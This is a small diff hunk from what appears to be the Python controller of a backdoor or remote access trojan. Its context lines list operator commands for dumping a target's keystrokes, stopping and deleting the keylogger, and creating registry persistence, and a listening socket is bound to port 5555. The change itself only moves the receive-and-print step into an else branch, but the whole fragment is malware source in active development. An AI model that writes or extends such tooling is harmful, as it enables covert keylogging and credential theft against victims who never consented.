@@ -32,9 +32,9 @@ def target_communication():
             keylog_dump                         --> Print Keystrokes That The Target Inputted
             keylog_stop                         --> Stop And Self Destuct Keylooger File
             persistent *RegName* *fileName*     --> Create Persistent In Registry'''))
-            
-        result = reliable_recv()
-        print(result)
+        else:            
+            result = reliable_recv()
+            print(result)
     
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('127.0.0.1', 5555))
